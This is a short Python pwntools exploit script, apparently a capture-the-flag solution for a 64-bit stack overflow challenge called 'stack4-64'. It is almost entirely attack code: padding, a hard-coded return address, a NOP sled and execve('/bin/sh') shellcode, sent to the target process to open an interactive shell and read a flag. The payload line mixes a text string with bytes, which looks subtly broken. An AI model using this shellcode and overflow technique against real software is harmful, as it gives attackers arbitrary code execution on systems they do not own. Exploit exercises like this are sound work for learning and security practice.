from pwn import *
#context.log_level='debug'
shellcode =   b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
# littleEndian = b"\x05\x0f\x3b\xb0\x5f\x54\x53\x68\x73\x2f\x2f\x6e\x69\x62\x2f\xbb\x48\xf6\x31\xd2\x31\x48\x50"
noOp = b"\x90" * 1000
ret = p64(0x7fffffffe5d0) #ebp 0x7fffffffe430
padding = "A" * 104
payload = padding + ret + noOp + shellcode
#print(payload)
p = process("/problems/stack4r-64_0_7854aa8a0f857f3f0e7218c64c0bfdf1/stack4-64")
p.send(payload)
p.interactive()
#p.send("cat flag.txt")
